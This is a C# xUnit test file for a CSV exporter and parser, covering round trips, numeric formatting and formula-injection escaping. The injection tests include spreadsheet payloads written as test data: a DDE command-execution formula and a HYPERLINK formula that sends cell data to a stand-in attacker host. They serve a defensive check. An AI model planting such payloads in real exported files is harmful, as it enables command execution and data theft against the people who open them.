using System.Text;
using Foundry.FileIO;
using Xunit;

namespace Foundry.FileIO.Tests;

/// <summary>
/// CSV import and export round-tripping, and the treatment of values that a spreadsheet would
/// interpret rather than display.
/// </summary>
public class CsvTests
{
    public sealed class Product
    {
        public string Name { get; set; } = string.Empty;
        public decimal Price { get; set; }
        public int Quantity { get; set; }
    }

    private static async Task<string> Export(params Product[] products)
    {
        var output = new MemoryStream();
        await new CsvDataExporter<Product>().ExportAsync(ToAsync(products), output);

        output.Position = 0;
        return await new StreamReader(output).ReadToEndAsync();
    }

    private static async IAsyncEnumerable<Product> ToAsync(IEnumerable<Product> products)
    {
        foreach (var product in products)
        {
            yield return product;
            await Task.CompletedTask;
        }
    }

    private static async Task<List<Product>> Parse(string csv)
    {
        var stream = new MemoryStream(Encoding.UTF8.GetBytes(csv));
        var results = new List<Product>();

        await foreach (var product in new CsvDataParser<Product>().ParseAsync(stream))
        {
            results.Add(product);
        }

        return results;
    }

    // ---- round trip ----

    [Fact]
    public async Task ExportWritesAHeaderAndARowPerRecord()
    {
        var csv = await Export(
            new Product { Name = "Widget", Price = 9.99m, Quantity = 3 },
            new Product { Name = "Gadget", Price = 19.50m, Quantity = 1 });

        var lines = csv.Split('\n', StringSplitOptions.RemoveEmptyEntries);

        Assert.Equal(3, lines.Length);
        Assert.Contains("Name", lines[0]);
        Assert.Contains("Widget", lines[1]);
    }

    [Fact]
    public async Task ValuesSurviveARoundTrip()
    {
        var csv = await Export(new Product { Name = "Widget", Price = 9.99m, Quantity = 3 });

        var parsed = Assert.Single(await Parse(csv));

        Assert.Equal("Widget", parsed.Name);
        Assert.Equal(9.99m, parsed.Price);
        Assert.Equal(3, parsed.Quantity);
    }

    [Fact]
    public async Task EmbeddedCommasAndQuotesSurviveARoundTrip()
    {
        var csv = await Export(new Product { Name = "Widget, \"large\"", Price = 1m, Quantity = 1 });

        var parsed = Assert.Single(await Parse(csv));

        Assert.Equal("Widget, \"large\"", parsed.Name);
    }

    [Fact]
    public async Task NegativeNumbersSurviveARoundTrip()
    {
        // Guards the formula-escaping rule below: a negative number begins with '-', and escaping it
        // as though it were a formula would corrupt ordinary numeric data.
        var csv = await Export(new Product { Name = "Refund", Price = -5.25m, Quantity = -2 });

        var parsed = Assert.Single(await Parse(csv));

        Assert.Equal(-5.25m, parsed.Price);
        Assert.Equal(-2, parsed.Quantity);
        Assert.Contains("-5.25", csv);
    }

    [Fact]
    public async Task DecimalsAreWrittenInvariantly()
    {
        var original = System.Globalization.CultureInfo.CurrentCulture;
        try
        {
            System.Globalization.CultureInfo.CurrentCulture =
                new System.Globalization.CultureInfo("de-DE");

            var csv = await Export(new Product { Name = "Widget", Price = 9.99m, Quantity = 1 });

            Assert.Contains("9.99", csv);
        }
        finally
        {
            System.Globalization.CultureInfo.CurrentCulture = original;
        }
    }

    // ---- formula injection ----

    [Theory]
    [InlineData("=1+1")]
    [InlineData("=cmd|'/c calc'!A0")]
    [InlineData("+1+1")]
    [InlineData("@SUM(A1)")]
    [InlineData("=HYPERLINK(\"http://evil.example.com?d=\"&A1,\"click\")")]
    public async Task AValueThatASpreadsheetWouldExecuteIsNeutralised(string hostileName)
    {
        // CSV formula injection. An exported field beginning with =, +, @ (or a tab/CR) is evaluated
        // as a formula when the file is opened in Excel or Sheets, so a user who types
        // =HYPERLINK(...) into a name field gets it executed in the reader's session -- which is how
        // exported data becomes a delivery mechanism for exfiltration. Foundry exports
        // user-controlled entity data, so neutralising it is the exporter's job.
        var csv = await Export(new Product { Name = hostileName, Price = 1m, Quantity = 1 });

        var dataLine = csv.Split('\n', StringSplitOptions.RemoveEmptyEntries)[1];
        var firstField = dataLine.TrimStart('"');

        Assert.False(
            firstField.StartsWith('=') || firstField.StartsWith('+') || firstField.StartsWith('@'),
            $"exported field begins with a formula trigger: {dataLine}");
    }

    [Fact]
    public async Task ANeutralisedValueStillCarriesItsOriginalText()
    {
        // Escaping must not destroy the data -- the original text has to remain legible in the cell.
        var csv = await Export(new Product { Name = "=1+1", Price = 1m, Quantity = 1 });

        Assert.Contains("1+1", csv);
    }

    [Fact]
    public async Task OrdinaryTextIsNotAltered()
    {
        var csv = await Export(new Product { Name = "Widget", Price = 1m, Quantity = 1 });

        Assert.Contains("Widget", csv);
        Assert.DoesNotContain("'Widget", csv);
    }

    // ---- parsing ----

    [Fact]
    public async Task AHeaderOnlyFileYieldsNoRecords()
    {
        Assert.Empty(await Parse("Name,Price,Quantity\n"));
    }

    [Fact]
    public async Task AnEmptyFileYieldsNoRecords()
    {
        Assert.Empty(await Parse(""));
    }

    [Fact]
    public async Task ColumnOrderDoesNotMatter()
    {
        var parsed = Assert.Single(await Parse("Quantity,Name,Price\n7,Widget,3.50\n"));

        Assert.Equal("Widget", parsed.Name);
        Assert.Equal(7, parsed.Quantity);
        Assert.Equal(3.50m, parsed.Price);
    }

    [Fact]
    public async Task AMissingColumnLeavesItsPropertyAtDefault()
    {
        // Configured behaviour (MissingFieldFound = null). Asserted so it is a deliberate contract.
        var parsed = Assert.Single(await Parse("Name\nWidget\n"));

        Assert.Equal("Widget", parsed.Name);
        Assert.Equal(0m, parsed.Price);
    }
}
